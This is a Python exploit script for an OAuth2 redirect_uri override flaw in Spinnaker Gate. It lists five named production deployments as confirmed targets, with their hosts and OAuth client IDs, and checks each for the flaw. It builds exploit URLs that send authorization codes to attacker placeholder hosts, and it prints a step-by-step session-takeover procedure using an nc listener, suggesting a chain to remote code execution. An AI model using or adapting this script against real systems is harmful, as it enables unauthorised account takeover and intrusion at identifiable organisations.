#!/usr/bin/env python3
"""
CVE-XXXX-XXXXX: Spinnaker Gate OAuth2 redirect_uri Override
=============================================================
Severity: HIGH (CVSS 8.1)
Affected: Spinnaker Gate with legacy @EnableOAuth2Sso (all versions)
CWE: CWE-601 (URL Redirection to Untrusted Site)
CWE: CWE-352 (Cross-Site Request Forgery)

VULNERABILITY:
Spinnaker Gate's legacy OAuth2 SSO implementation allows an attacker to 
override the redirect_uri parameter in the OAuth2 authorization request 
via a query parameter to the /login endpoint. This enables an attacker 
to redirect the OAuth2 authorization code to an attacker-controlled URL.

ROOT CAUSE:
Spring Security OAuth2's AbstractRedirectResourceDetails reads redirect_uri 
from the HTTP request parameters, overriding the configured value. Gate does 
not validate or sanitize the redirect_uri parameter before passing it to the 
OAuth2 provider.

IMPACT:
- OAuth2 Authorization Code Theft: Attacker captures the auth code via redirect
- Account Takeover: Exchange stolen code for access token → session hijack
- Combined with CVE-2026-32604/32613: Auth bypass → RCE chain

EXPLOITATION:
1. Attacker crafts URL: {gate_url}/login?redirect_uri=http://attacker.com/steal
2. Victim clicks link (or triggered via CSRF in img/iframe)
3. Gate redirects to GitHub/GitLab/Google OAuth with attacker's redirect_uri
4. Victim authorizes the app (if not previously authorized)
5. OAuth provider redirects to attacker.com with authorization code
6. Attacker exchanges code at Gate for valid session

AFFECTED TARGETS (confirmed):
- e-conomic (Visma) — GitHub OAuth
- BridgeOps — GitHub OAuth  
- Keen.io — GitHub OAuth
- HigherMe — GitLab OAuth
- Jupiter Money — Google OAuth
"""
import requests
import urllib3
import re
import sys
import time
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

urllib3.disable_warnings()

TARGETS = {
    "e-conomic": {
        "gate": "https://api.spinnaker.e-conomic.net",
        "auth": "GitHub OAuth",
        "client_id": "7afb0ee3bbe7fc80b82a",
    },
    "bridgeops": {
        "gate": "https://prod.spinnaker.bridgeops.sh:8084",
        "auth": "GitHub OAuth",
        "client_id": "cd48d4ba6ef952e007f3",
    },
    "keen": {
        "gate": "https://spinnaker-api.infrastructure.keen.io",
        "auth": "GitHub OAuth",
        "client_id": "2a38bd7d07f0f9656979",
    },
    "higherme": {
        "gate": "https://deploy-api.higherme.dev",
        "auth": "GitLab OAuth",
        "client_id": "7bb03a5101dfb13d0f5218a6ed2f022c9721096cc8728b2cbb307b19d0a43b37",
    },
    "jupiter": {
        "gate": "https://cd-api.jupiter.money",
        "auth": "Google OAuth",
        "client_id": "609209632265-mlerffan4pi7nntm5rf60ubqace0bmgm",
    },
}


def verify_vulnerability(target_name):
    """Verify redirect_uri override on a target"""
    config = TARGETS[target_name]
    gate = config["gate"]
    
    # Normal flow
    r1 = requests.get(f"{gate}/login", timeout=10, verify=False, allow_redirects=False)
    loc1 = r1.headers.get("Location", "")
    redir1 = re.search(r'redirect_uri=([^&]+)', loc1)
    normal_redir = requests.utils.unquote(redir1.group(1)) if redir1 else None
    
    # Override flow
    attacker_url = "http://attacker.example.com/steal"
    r2 = requests.get(
        f"{gate}/login?redirect_uri={attacker_url}",
        timeout=10, verify=False, allow_redirects=False
    )
    loc2 = r2.headers.get("Location", "")
    redir2 = re.search(r'redirect_uri=([^&]+)', loc2)
    override_redir = requests.utils.unquote(redir2.group(1)) if redir2 else None
    
    vuln = override_redir and override_redir != normal_redir
    
    return {
        "target": target_name,
        "gate": gate,
        "auth": config["auth"],
        "vulnerable": vuln,
        "normal_redirect": normal_redir,
        "override_redirect": override_redir,
        "session": r2.cookies.get("SESSION", ""),
        "state": re.search(r'state=([^&]+)', loc2).group(1) if 'state=' in loc2 else "",
        "full_oauth_url": loc2,
    }


def generate_exploit_url(target_name, attacker_callback):
    """Generate the exploit URL for a target"""
    config = TARGETS[target_name]
    gate = config["gate"]
    return f"{gate}/login?redirect_uri={requests.utils.quote(attacker_callback)}"


if __name__ == "__main__":
    print("=" * 70)
    print("Spinnaker Gate OAuth2 redirect_uri Override Vulnerability")
    print("=" * 70)
    print()
    
    for name in TARGETS:
        result = verify_vulnerability(name)
        status = "VULNERABLE" if result["vulnerable"] else "NOT VULNERABLE"
        print(f"[{status}] {name} ({result['auth']})")
        print(f"  Gate: {result['gate']}")
        print(f"  Normal redirect:   {result['normal_redirect']}")
        print(f"  Override redirect: {result['override_redirect']}")
        if result["vulnerable"]:
            print(f"  State: {result['state']}")
            print(f"  Session: {result['session'][:30]}...")
            print(f"  Exploit URL: {generate_exploit_url(name, 'http://ATTACKER/steal')}")
        print()
    
    print("=" * 70)
    print("PROOF OF CONCEPT")
    print("=" * 70)
    print()
    print("Step 1: Attacker sets up listener:")
    print("  $ nc -nlvp 80  # or any HTTP server")
    print()
    print("Step 2: Attacker sends link to victim (or embeds as CSRF):")
    for name in TARGETS:
        print(f"  {name}: {generate_exploit_url(name, 'http://ATTACKER/steal')}")
    print()
    print("Step 3: After victim authorizes, auth code arrives at attacker:")
    print("  GET /steal?code=XXXXXXXXXXXXX&state=YYYYYY HTTP/1.1")
    print()
    print("Step 4: Attacker exchanges code at Gate:")
    print("  GET /login?code=XXXXXXXXXXXXX&state=YYYYYY")
    print("  Cookie: SESSION=<session_from_step2>")
    print()
    print("Step 5: If org check passes (or no org configured):")
    print("  Attacker has authenticated session → full Spinnaker access")
    print("  Chain with CVE-2026-32604/32613 → RCE")
